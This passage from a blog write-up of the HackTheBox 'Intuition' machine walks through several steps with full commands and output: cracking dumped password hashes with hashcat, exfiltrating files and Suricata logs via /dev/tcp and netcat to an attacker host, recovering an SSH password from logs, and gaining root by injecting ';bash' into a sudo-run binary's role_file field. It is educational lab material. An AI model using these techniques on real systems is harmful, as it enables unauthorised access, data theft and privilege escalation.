sqlite&gt; select username,password from users;
admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606
adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43
</code></pre>

<p>I can try to  bruteforce the hash by trying all the combinations of the dictionary rockyou.txt which has a lot of common insecure passwords and if the password used for the hash is in that dictionary, I can retrieve it.</p>

<p>I will start with the adam one and hashcat is auto-sufficient for detecting the hash type and it successfully cracks:</p>

<pre><code class="language-bash">❯ hashcat adam.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5600G with Radeon Graphics, 3417/6898 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) | Framework

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

&lt;..SNIP..&gt;

sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 30120 (Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)))
Hash.Target......: sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc...89fc43
Time.Started.....: Mon Sep  9 13:33:47 2024 (13 secs)
Time.Estimated...: Mon Sep  9 13:34:00 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   628.7 kH/s (2.08ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10375168/14344385 (72.33%)
Rejected.........: 0/10375168 (0.00%)
Restore.Point....: 10373120/14344385 (72.31%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: adambayu -&gt; adadeh289
Hardware.Mon.#1..: Util: 96%

Started: Mon Sep  9 13:33:28 2024
Stopped: Mon Sep  9 13:34:01 2024
</code></pre>

<p>The password for adam is “adam gray” and the admin’s hash doesn’t crack:</p>

<pre><code class="language-bash">❯ hashcat admin.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5600G with Radeon Graphics, 3417/6898 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) | Framework

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

&lt;..SNIP..&gt;         

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 30120 (Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)))
Hash.Target......: sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27...e9b606
Time.Started.....: Mon Sep  9 13:37:48 2024 (20 secs)
Time.Estimated...: Mon Sep  9 13:38:08 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   643.9 kH/s (2.31ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 97%

Started: Mon Sep  9 13:37:47 2024
Stopped: Mon Sep  9 13:38:09 2024
</code></pre>

<p>The adam’s password doesn’t work in the system:</p>

<pre><code class="language-bash">dev_acc@intuition:/var/www/app$ su adam
Password: adam gray
su: Authentication failure
</code></pre>

<p>But there’s also a username adam in the ftp installation:</p>

<pre><code class="language-bash">dev_acc@intuition:/var/www/app$ cd /opt/ftp/
dev_acc@intuition:/opt/ftp$ ls
adam  ftp_admin
</code></pre>

<p>So I will try it there and it works:</p>

<pre><code class="language-bash">dev_acc@intuition:/opt/ftp$ ftp localhost
Connected to localhost.
220 pyftpdlib 1.5.7 ready.
Name (localhost:dev_acc): adam
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; 
</code></pre>

<p>There are some backup files of something called runner1 but I have access denied:</p>

<pre><code class="language-bash">ftp&gt; dir
229 Entering extended passive mode (|||55389|).
150 File status okay. About to open data connection.
drwxr-xr-x   3 root     1002         4096 Apr 10 08:21 backup
226 Transfer complete.
ftp&gt; cd backup
250 "/backup" is the current directory.
ftp&gt; dir
229 Entering extended passive mode (|||50105|).
125 Data connection already open. Transfer starting.
drwxr-xr-x   2 root     1002         4096 Apr 10 08:21 runner1
226 Transfer complete.
ftp&gt; cd runner
550 No such file or directory.
ftp&gt; cd runner1
250 "/backup/runner1" is the current directory.
ftp&gt; dir
229 Entering extended passive mode (|||36941|).
125 Data connection already open. Transfer starting.
-rwxr-xr-x   1 root     1002          318 Apr 06 00:25 run-tests.sh
-rwxr-xr-x   1 root     1002        16744 Oct 19  2023 runner1
-rw-r--r--   1 root     1002         3815 Oct 19  2023 runner1.c
226 Transfer complete.
ftp&gt; prompt off
Interactive mode off.
ftp&gt; mget .
local: run-tests.sh remote: run-tests.sh
229 Entering extended passive mode (|||40779|).
125 Data connection already open. Transfer starting.
100% |*******************************************************************************************************************************************|   318      152.97 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (140.45 KiB/s)
local: runner1 remote: runner1
229 Entering extended passive mode (|||55749|).
125 Data connection already open. Transfer starting.
100% |*******************************************************************************************************************************************| 16744        2.19 MiB/s    00:00 ETA
226 Transfer complete.
16744 bytes received in 00:00 (2.12 MiB/s)
local: runner1.c remote: runner1.c
229 Entering extended passive mode (|||45135|).
150 File status okay. About to open data connection.
100% |*******************************************************************************************************************************************|  3815      871.88 KiB/s    00:00 ETA
226 Transfer complete.
3815 bytes received in 00:00 (831.41 KiB/s)
</code></pre>

<p>And I receive the files in current directory:</p>

<pre><code class="language-bash">dev_acc@intuition:/tmp$ ls {runner1,runner1.c,run-tests.sh}
runner1  runner1.c  run-tests.sh
</code></pre>

<p>I will move it into a directory, zip it and transfer it to my machine:</p>

<pre><code class="language-bash">dev_acc@intuition:/tmp$ mkdir adam-ftp
dev_acc@intuition:/tmp$ mv {runner1,runner1.c,run-tests.sh} adam-ftp/
dev_acc@intuition:/tmp$ zip adam-ftp-files -r adam-ftp/ 
  adding: adam-ftp/ (stored 0%)
  adding: adam-ftp/runner1.c (deflated 69%)
  adding: adam-ftp/runner1 (deflated 77%)
  adding: adam-ftp/run-tests.sh (deflated 47%)
dev_acc@intuition:/tmp$ cat adam-ftp-files.zip &gt; /dev/tcp/10.10.15.95/443
</code></pre>

<p>I will unzip it and inspect the files inside:</p>

<pre><code class="language-bash">❯ unzip adam-ftp-files.zip
❯ cd adam-ftp
</code></pre>

<p>The runner1 file is a binary:</p>

<pre><code class="language-bash">❯ file runner1
runner1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f520676a77c2264a29f5aa68c1d1f14eef2299c5, for GNU/Linux 3.2.0, not stripped
</code></pre>

<p>And runner1.c is probably the C code for the runner1 binary:</p>

<pre><code class="language-c">// Version : 1

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;dirent.h&gt;
#include &lt;openssl/md5.h&gt;

#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i &lt; 16; i++) {
        sprintf(&amp;md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}

void listPlaybooks() {
    DIR *dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL) {
        perror("Failed to open the playbook directory");
        return;
    }

    struct dirent *entry;
    int playbookNumber = 1;

    while ((entry = readdir(dir)) != NULL) {
        if (entry-&gt;d_type == DT_REG &amp;&amp; strstr(entry-&gt;d_name, ".yml") != NULL) {
            printf("%d: %s\n", playbookNumber, entry-&gt;d_name);
            playbookNumber++;
        }
    }

    closedir(dir);
}

void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}

int main(int argc, char *argv[]) {
    if (argc &lt; 2) {
        printf("Usage: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;\n", argv[0]);
        return 1;
    }

    int auth_required = 0;
    char auth_key[128];

    for (int i = 2; i &lt; argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 &lt; argc) {
                strncpy(auth_key, argv[i + 1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }
        }
    }

    if (!check_auth(auth_key)) {
        printf("Error: Authentication failed.\n");
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0) {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber &gt; 0) {
            DIR *dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL) {
                perror("Failed to open the playbook directory");
                return 1;
            }

            struct dirent *entry;
            int currentPlaybookNumber = 1;
            char *playbookName = NULL;

            while ((entry = readdir(dir)) != NULL) {
                if (entry-&gt;d_type == DT_REG &amp;&amp; strstr(entry-&gt;d_name, ".yml") != NULL) {
                    if (currentPlaybookNumber == playbookNumber) {
                        playbookName = entry-&gt;d_name;
                        break;
                    }
                    currentPlaybookNumber++;
                }
            }

            closedir(dir);

            if (playbookName != NULL) {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }
        } else {
            printf("Invalid playbook number.\n");
        }
    } else if (strcmp(argv[1], "install") == 0) {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;\n", argv[0]);
        return 1;
    }

    return 0;
}

</code></pre>

<p>The run-tests.sh gives examples on how to use it and leaks a part of the auth code:</p>

<pre><code class="language-bash">❯ /bin/cat run-tests.sh
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
</code></pre>

<p>However that is not useful by now because I didn’t found any privileged runner1 binary.</p>
    
      <h1 id="access-as-lopez">
        
        
          Access as lopez <a href="#access-as-lopez" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>There is a suricata folder in /var/log, which is not default:</p>

<pre><code class="language-bash">dev_acc@intuition:/var/log$ ls
apache2   auth.log.1     dmesg       dmesg.3.gz  kern.log       lastlog  suricata     vmware-network.1.log  vmware-network.5.log  vmware-vmsvc-root.1.log  vmware-vmtoolsd-root.log
apt       auth.log.2.gz  dmesg.0     dmesg.4.gz  kern.log.1     laurel   syslog       vmware-network.2.log  vmware-network.6.log  vmware-vmsvc-root.2.log  wtmp
audit     btmp           dmesg.1.gz  installer   kern.log.2.gz  nginx    syslog.1     vmware-network.3.log  vmware-network.7.log  vmware-vmsvc-root.3.log
auth.log  btmp.1         dmesg.2.gz  journal     landscape      private  syslog.2.gz  vmware-network.4.log  vmware-network.log    vmware-vmsvc-root.log
</code></pre>

<p>Searching that folder in google, leds to a software called “Suricata”:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909192802.png" alt="" /></p>

<p>Suricata is a network analysis and threat detection software:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909192852.png" alt="" /></p>

<p>It would be interesting to look at this because it can have passwords or credentials used in the network so I will zip it and transfer it to my machine:</p>

<pre><code class="language-bash">❯ nc -lvnp 443 &gt; suricata-logs.zip
</code></pre>

<pre><code class="language-bash">dev_acc@intuition:/var/log$ zip /tmp/suricata-logs -r suricata/
dev_acc@intuition:/var/log$ cat /tmp/suricata-logs.zip &gt; /dev/tcp/10.10.15.95/443
</code></pre>

<pre><code class="language-bash">❯ unzip suricata-logs.zip
❯ cd suricata
❯ gzip -d *.gz
</code></pre>

<p>Filtering for word “pass” gives ftp commands that a <code>lopez</code> user used:</p>

<pre><code class="language-bash">❯ cat * | grep --text -i pass | grep -vE 'flow.mgr.full_hash_pass|"event_type":"stats"|"http_user_agent":"Fuzz Faster U Fool v2.0.0-dev"'
</code></pre>

<blockquote>
  <p>Note: here I removed lines that contained <code>"event_type": "stats"</code> because that’s not network data and also removed the lines that contained <code>"http_user_agent":"Fuzz Faster U Fool v2.0.0-dev"</code> because that was fuzzing requests of me and another users of hackthebox. The removing of <code>flow.mgr.full_hash_pass</code> is because it disturbed and didn’t gived interesting data.</p>
</blockquote>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910212341.png" alt="" />
I can see two possible password for user lopez, “Lopezzz1992%123” and “Lopezz1992%123”. They obviously doesn’t work for ftp (because there is not directory in /opt/ftp with name lopez):</p>

<pre><code class="language-bash">dev_acc@intuition:/var/log$ ftp lopez@localhost
Connected to localhost.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: Lopezzz1992%123
530 Authentication failed.
ftp: Login failed
dev_acc@intuition:/var/log$ ftp lopez@localhost
Connected to localhost.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: Lopezz1992%123
530 Authentication failed.
ftp: Login failed
</code></pre>

<p>But ‘Lopezz1992%123’ work for ssh:</p>

<pre><code class="language-bash">❯ sshpass -p 'Lopezzz1992%123' ssh lopez@10.10.11.15
Permission denied, please try again.
❯ sshpass -p 'Lopezz1992%123' ssh lopez@10.10.11.15

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

lopez@intuition:~$ 
</code></pre>
    
      <h1 id="access-as-root">
        
        
          Access as root <a href="#access-as-root" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>The lopez user has a sudoers privilege that lets him run <code>/opt/runner2/runner2</code> as any user he wants:</p>

<pre><code class="language-bash">lopez@intuition:~$ sudo -l
[sudo] password for lopez: Lopezz1992%123
Matching Defaults entries for lopez on intuition:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2
</code></pre>

<p>This seems similar to runner1, running it shows the help panel and asks for a json file:</p>

<pre><code class="language-bash">lopez@intuition:~$ sudo /opt/runner2/runner2 
Usage: /opt/runner2/runner2 &lt;json_file&gt;
</code></pre>

<p>But runner1 doesn’t asks for it, so it’s different:</p>

<pre><code class="language-bash">❯ cd adam-ftp
❯ ls
run-tests.sh  runner1  runner1.c
❯ ./runner1
Usage: ./runner1 [list|run playbook_number|install role_url] -a &lt;auth_key&gt;
</code></pre>
    
      <h2 id="analysis-of-runner2">
        
        
          Analysis of runner2 <a href="#analysis-of-runner2" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h2>

<p>I will transfer runner2 to my machine to analyze it:</p>

<pre><code class="language-bash">❯ nc -lvnp 443 &gt; runner2
listening on [any] 443 ...
</code></pre>

<pre><code class="language-bash">lopez@intuition:/tmp$ cat /opt/runner2/runner2 &gt; /dev/tcp/10.10.15.95/443
</code></pre>

<p>Running it, asks for a json file:</p>

<pre><code class="language-bash">❯ chmod +x runner2
❯ ./runner2
Usage: ./runner2 &lt;json_file&gt;
</code></pre>

<p>So it’s different to runner1, which asks for a method and an auth key:</p>

<pre><code class="language-bash">❯ ./adam-ftp/runner1
Usage: ./adam-ftp/runner1 [list|run playbook_number|install role_url] -a &lt;auth_key&gt;
</code></pre>

<p>Trying it with a random json file gives an error:</p>

<pre><code class="language-bash">❯ /bin/cat test.json
{"key": "value"}
❯ ./runner2 test.json
Run key missing or invalid.
</code></pre>
    
      <h1 id="static-analysis-of-runner2">
        
        
          Static analysis of runner2 <a href="#static-analysis-of-runner2" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>I will open ghidra, create a new project (File &gt; New project) and import the binary runner2 (File &gt; Import File). Then drag the binary to the dragon symbol and I can see the main code in Functions &gt; main. After analysing the code, renaming variables and putting comments, I can understand more or less how the binary works.</p>

<p>First it parses some json data inside the json file and checks if the action key inside a run key exists so the syntax must be <code>{"run": {"action": "somethingToDo"}}</code> or otherwise it will give an error:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909232253.png" alt="" /></p>

<p>If the action is equal to “list”, it calls the function listPlaybooks:
<img src="/assets/images/Intuition/Pasted%20image%2020240909232308.png" alt="" /></p>

<p>If I double click on this function, I can see that it just go for all the files in /opt/playbooks and if it’s yml, it prints the file with the corresponding id:
<img src="/assets/images/Intuition/Pasted%20image%2020240910100656.png" alt="" /></p>

<p>That’s exactly what happens if I run it on the victim machine with a valid json that specifies that the action is list:</p>

<pre><code class="language-bash">lopez@intuition:/tmp$ cat listPlaybooks.json 
{
	"run": {
		"action": "list"
	}
}
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 listPlaybooks.json 
[sudo] password for lopez: Lopezz1992%123
1: apt_update.yml
</code></pre>

<p>The code that manages what happens if the action is run is this:
<img src="/assets/images/Intuition/Pasted%20image%2020240910101737.png" alt="" /></p>

<p>It needs more keys, “num” inside the “run” key and “auth_code” in the main object (<code>{"run": {"action": "run", "num": something}, "auth_code": something}</code>):</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910101943.png" alt="" /></p>

<p>The <code>auth_code</code> key is needed to check if it’s correct using the <code>check_auth</code> function:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910102044.png" alt="" />
The <code>check_auth</code> function checks if the md5 hash of the string passed (in this case auth_code value in the json) is equal to “0feda17076d793c2ef2870d7427ad4ed”</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910102456.png" alt="" /></p>

<p>If the auth is successfull it enters in this piece of code, which just goes for each .yml file in <code>/opt/playbooks</code> directory and if the index of that file is equal to the value specified in <code>num</code> key, it will call the function runPlaybook passing the file as argument:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910102614.png" alt="" /></p>

<p>The runPlaybook function executes the command `                       /usr/bin/ansible-playbook -i /opt/playbooks/inventory.ini /opt/playbooks/<playbookFile>` where playbookFile is the file that corresponds to the "num" key in the json file specified:</playbookFile></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910110221.png" alt="" /></p>

<p>If I manage to run a custom ansible playbook it would be very interesting because I can run commands like shown <a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html#examples">here</a>. But it won’t be the case.</p>

<p>By now, I only need the correct auth_code and I remembered that the file <code>run-tests.sh</code> from the ftp files that <code>adam</code> had access leaked a part of the auth code:</p>

<pre><code class="language-bash">❯ cd adam-ftp
❯ ls
run-tests.sh  runner1  runner1.c
❯ /bin/cat run-tests.sh
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
</code></pre>

<p>And the auth_code hasn’t changed from <code>runner1</code> and <code>runner2</code>:</p>

<pre><code class="language-bash">❯ cat runner1.c | grep AUTH_KEY_HASH
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"
</code></pre>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910103215.png" alt="" /></p>

<p>So I will bruteforce it using hashcat with not a dictionary but a set of characters and it cracks so fast:</p>

<pre><code class="language-bash">❯ /bin/cat auth_code.hash
0feda17076d793c2ef2870d7427ad4ed
❯ hashcat -a 3 -m 0 auth_code.hash 'UHI75GHI?a?a?a?a'
hashcat (v6.2.6) starting

&lt;..SNIP..&gt;

0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 0feda17076d793c2ef2870d7427ad4ed
Time.Started.....: Tue Sep 10 10:35:30 2024 (3 secs)
Time.Estimated...: Tue Sep 10 10:35:33 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: UHI75GHI?a?a?a?a [12]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3821.3 kH/s (0.19ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11192320/81450625 (13.74%)
Rejected.........: 0/11192320 (0.00%)
Restore.Point....: 11190272/81450625 (13.74%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: UHI75GHI5ZE2 -&gt; UHI75GHI%!0*
Hardware.Mon.#1..: Util: 70%

Started: Tue Sep 10 10:35:13 2024
Stopped: Tue Sep 10 10:35:35 2024
</code></pre>

<p>The <code>-a 3</code> specifies bruteforce mode and where there is a ?a means that there goes a character that can be a letter, digit or symbol like specified in the hashcat help panel:</p>

<pre><code class="language-bash">❯ hashcat --help
</code></pre>
<p><img src="/assets/images/Intuition/Pasted%20image%2020240910104423.png" alt="" />
<img src="/assets/images/Intuition/Pasted%20image%2020240910104518.png" alt="" /></p>

<p>Now that I have the auth_code, I will run runner2 in the victim machine specifying the num 1 as it’s the only playbook available and it runs sucessfully:</p>

<pre><code class="language-bash">lopez@intuition:/tmp$ vi runPlaybook1.json 
{
	"run": {
		"action": "run",
		"num": 1
	},
	"auth_code": "UHI75GHINKOP"
}
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 runPlaybook1.json 
[sudo] password for lopez: 

PLAY [Update and Upgrade APT Packages test] ********************************************************************************************************************************************

TASK [Gathering Facts] *****************************************************************************************************************************************************************
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
ok: [127.0.0.1]

TASK [Update APT Cache] ****************************************************************************************************************************************************************
[WARNING]: Skipping plugin (/usr/lib/python3/dist-packages/ansible/plugins/filter/core.py) as it seems to be invalid: cannot import name 'environmentfilter' from 'jinja2.filters'
(/usr/local/lib/python3.11/dist-packages/jinja2/filters.py)
[WARNING]: Skipping plugin (/usr/lib/python3/dist-packages/ansible/plugins/filter/mathstuff.py) as it seems to be invalid: cannot import name 'environmentfilter' from 'jinja2.filters'
(/usr/local/lib/python3.11/dist-packages/jinja2/filters.py)
</code></pre>

<p>Nothing interesting by now because it only updates the apt cache and the packages:</p>

<pre><code class="language-bash">lopez@intuition:/tmp$ cat /opt/playbooks/apt_update.yml 
---
- name: Update and Upgrade APT Packages test
  hosts: local
  become: yes
  tasks:
    - name: Update APT Cache
      apt:
        update_cache: yes
      when: ansible_distribution == 'Debian' or ansible_distribution == 'Ubuntu'

    - name: Upgrade APT Packages
      apt:
        upgrade: dist
        update_cache: yes
      when: ansible_distribution == 'Debian' or ansible_distribution == 'Ubuntu'
</code></pre>

<p>However, there is another functionality, which is install and it needs a key “role_file” which is passed as argument to the function installRole:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910105337.png" alt="" /></p>

<p>The installRole function checks if the role file is a valid .tar archive and if that is the case, it executes the command <code>/usr/bin/ansible-galaxy install &lt;role_file&gt;</code> where role_file is the file specified in the “role_file” key in the json:
<img src="/assets/images/Intuition/Pasted%20image%2020240910105534.png" alt="" /></p>

<p>This is interesting as there is no sanitization in the system command and I can append another command to execute with a <code>;</code>. However the file needs to be a valid tar archive.</p>

<p>To create a role file I need to create a new role with the base structure:</p>
<pre><code class="language-bash">❯ mkdir ansible-galaxy
❯ cd ansible-galaxy
❯ ansible-galaxy role init test
- Role test was created successfully
</code></pre>
<p>Now I have the role folder created:</p>
<pre><code class="language-bash">❯ /bin/ls test
README.md  defaults  files  handlers  meta  tasks  templates  tests  vars
</code></pre>
<p>I will tar compress it and transfer it to /tmp of the victim machine.</p>
<pre><code class="language-bash">❯ tar -cvzf test.tar.gz test
&lt;..SNIP..&gt;
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...```

```bash
lopez@intuition:/tmp$ wget http://10.10.15.95/test.tar.gz
--2024-09-10 16:24:36--  http://10.10.15.95/test.tar.gz
Connecting to 10.10.15.95:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1787 (1.7K) [application/gzip]
Saving to: ‘test.tar.gz’

test.tar.gz                                   100%[=================================================================================================&gt;]   1.75K  --.-KB/s    in 0s      

2024-09-10 16:24:36 (95.4 MB/s) - ‘test.tar.gz’ saved [1787/1787]
</code></pre>

<p>As saw before, there is no sanitization in the input passed to the system function. So I can rename the file to be ‘‘test.tar.gz;bash” and put that filename in the role_file key in the JSON file to execute a bash shell when I run the program:</p>

<pre><code class="language-bash">lopez@intuition:/tmp$ cp test.tar.gz test.tar.gz\;bash
lopez@intuition:/tmp$ vi installRole.json 
lopez@intuition:/tmp$ cat installRole.json 
{
	"run": 
	{
		"action": "install", 
		"role_file": "test.tar.gz;bash"
	}, 
	"auth_code": "UHI75GHINKOP"
}
</code></pre>

<p>Now I will run it and if it works, I should have a bash of root just because it’s run as root:</p>

<pre><code class="language-bash">lopez@intuition:/tmp$ sudo /opt/runner2/runner2 installRole.json 
Starting galaxy role install process
- test.tar.gz is already installed, skipping.
root@intuition:/tmp# 
</code></pre>

<p>It worked and I can see root.txt in /root:</p>

<pre><code class="language-bash">root@intuition:/tmp# cd /root/
root@intuition:~# cat root.txt 
ca****************************c6
</code></pre>

<p>That’s the machine guys. Hope you learned and liked!</p>



<div id="share-links">
  <span id="divider-line">____</span>
  <br><br>
  <small>14 September 2024</small>
  <div>
    
    Tags:
    
    <a href="/search?q=xss" class="tag" style="font-family: 'Cascadia Code';">xss</a>
    
    <a href="/search?q=cookie-hijacking" class="tag" style="font-family: 'Cascadia Code';">cookie-hijacking</a>
    
    <a href="/search?q=cve-2023-24329" class="tag" style="font-family: 'Cascadia Code';">cve-2023-24329</a>
    
    <a href="/search?q=urllib" class="tag" style="font-family: 'Cascadia Code';">urllib</a>
    
    <a href="/search?q=ssrf" class="tag" style="font-family: 'Cascadia Code';">ssrf</a>
    
    <a href="/search?q=ssrf-to-lfi" class="tag" style="font-family: 'Cascadia Code';">ssrf-to-lfi</a>
    
    <a href="/search?q=url-wrappers" class="tag" style="font-family: 'Cascadia Code';">url-wrappers</a>
    
    <a href="/search?q=ftp" class="tag" style="font-family: 'Cascadia Code';">ftp</a>
    
    <a href="/search?q=ssh-key" class="tag" style="font-family: 'Cascadia Code';">ssh-key</a>
    
    <a href="/search?q=ssh-key-comments" class="tag" style="font-family: 'Cascadia Code';">ssh-key-comments</a>
    
    <a href="/search?q=sqlite" class="tag" style="font-family: 'Cascadia Code';">sqlite</a>
    
    <a href="/search?q=hash-cracking" class="tag" style="font-family: 'Cascadia Code';">hash-cracking</a>
    
    <a href="/search?q=binary-analysis" class="tag" style="font-family: 'Cascadia Code';">binary-analysis</a>
    
    <a href="/search?q=suricata-logs" class="tag" style="font-family: 'Cascadia Code';">suricata-logs</a>
    
    <a href="/search?q=sudoers" class="tag" style="font-family: 'Cascadia Code';">sudoers</a>
    
    <a href="/search?q=ghidra" class="tag" style="font-family: 'Cascadia Code';">ghidra</a>
    
